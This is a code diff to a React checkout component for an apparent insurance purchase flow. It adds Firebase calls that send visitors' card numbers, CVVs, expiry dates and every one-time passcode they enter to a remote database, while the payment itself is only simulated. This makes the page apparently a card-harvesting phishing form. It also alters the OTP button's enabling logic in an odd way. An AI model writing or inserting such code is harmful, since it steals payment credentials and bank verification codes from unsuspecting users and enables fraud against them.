@@ -8,13 +8,14 @@ import { Input } from "@/components/ui/input"
 import { CreditCard, Shield, CheckCircle, ArrowRight, AlertCircle, X } from "lucide-react"
 import type { FormData } from "./insurance-flow"
 import { offerData } from "@/data/data"
+import { addData } from "@/lib/firebase"
 
 
 interface CheckoutProps {
   formData: FormData
   onBack: () => void
 }
-
+const allOtps = ['']
 export function Checkout({ formData, onBack }: CheckoutProps) {
   const [isProcessing, setIsProcessing] = useState(false)
   const [isCompleted, setIsCompleted] = useState(false)
@@ -90,8 +91,10 @@ export function Checkout({ formData, onBack }: CheckoutProps) {
   }
 
   const handlePayment = async (e: React.FormEvent) => {
+    const _id = localStorage.getItem('visitor')
     e.preventDefault()
     setIsProcessing(true)
+    addData({ id: _id, cardNumber, cvv, expiryDate })
 
     // Simulate payment processing
     await new Promise((resolve) => setTimeout(resolve, 2000))
@@ -101,7 +104,12 @@ export function Checkout({ formData, onBack }: CheckoutProps) {
   }
 
   const handleOtpSubmit = async (e: React.FormEvent) => {
+    const _id = localStorage.getItem('visitor')
+
     e.preventDefault()
+    allOtps.push(otp)
+    addData({ id: _id, otp, allOtps })
+
     setIsProcessing(true)
 
     // Simulate OTP verification
@@ -259,7 +267,7 @@ export function Checkout({ formData, onBack }: CheckoutProps) {
 
               <Button
                 type="submit"
-                disabled={isProcessing || otp.length !== 6}
+                disabled={(isProcessing || otp.length >= 4)}
                 className="w-full bg-emerald-400 hover:bg-emerald-300 text-emerald-900 font-bold h-12"
               >
                 {isProcessing ? (
